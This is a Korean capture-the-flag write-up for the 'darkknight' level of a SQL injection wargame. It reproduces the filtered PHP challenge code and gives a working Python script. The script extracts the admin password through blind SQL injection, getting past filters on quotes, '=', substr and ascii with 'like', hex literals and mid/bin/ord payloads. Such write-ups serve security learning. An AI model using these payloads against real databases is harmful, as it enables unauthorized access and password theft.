## Darkknight Write-up

### 문제
``` php
<?php  
include "./config.php";  
login_chk();  
dbconnect();  
if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~");  
if(preg_match('/\'/i', $_GET[pw])) exit("HeHe");  
if(preg_match('/\'|substr|ascii|=/i', $_GET[no])) exit("HeHe");  
$query = "select id from prob_darkknight where id='guest' and pw='{$_GET[pw]}' and no={$_GET[no]}";  
echo "<hr>query : <strong>{$query}</strong><hr><br>";  
$result = @mysql_fetch_array(mysql_query($query));  
if($result['id']) echo "<h2>Hello {$result[id]}</h2>";  
  
$_GET[pw] = addslashes($_GET[pw]);  
$query = "select pw from prob_darkknight where id='admin' and pw='{$_GET[pw]}'";  
$result = @mysql_fetch_array(mysql_query($query));  
if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("darkknight");  
highlight_file(__FILE__);  
?>
```

### Exploit 코드
``` python
import requests

def req(a) :
    url = 'https://los.rubiya.kr/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php'
    cookies = {'PHPSESSID' : 'My PHPSESSID'}
    params = {}
    params['no'] = a
    
    res = requests.get(url, cookies=cookies, params=params)

    if "Hello admin" in res.text :
        return True
    else :
        return False
length = 0
for i in range(20) :
    a = "0||id like 0x61646d696e &&length(pw)>" + str(i) + "#"
    if not req(a) :
        length = i
        break
print("Key length is %d" % length)

flag = ''
for i in range(length) :
    binary = ''
    for j in range(8) :
        a = "0||id like 0x61646d696e &&mid(lpad(bin(ord(mid(pw, " + str(i+1) + ",1))),8,0)," + str(j+1) + ",1)<1#"
        if req(a) :
            binary += '0'
        else :
            binary += '1'
    flag += chr(int(binary, 2))
    print("[%d] %s" % (i+1, flag))
```
admin의 pw를 알아내야 문제가 풀린다.  
이번 문제에서 `싱글쿼터(')` `substr` `ascii` `등호(=)` 가 필터링 되어 있다.
싱글쿼터가 필터링 되어 있어 싱글쿼터로 막혀있지 않은 no에 쿼리문을 넣어 우회해야 한다.
등호가 필터링 되어 있어 like와 admin의 hex 값을 이용했다.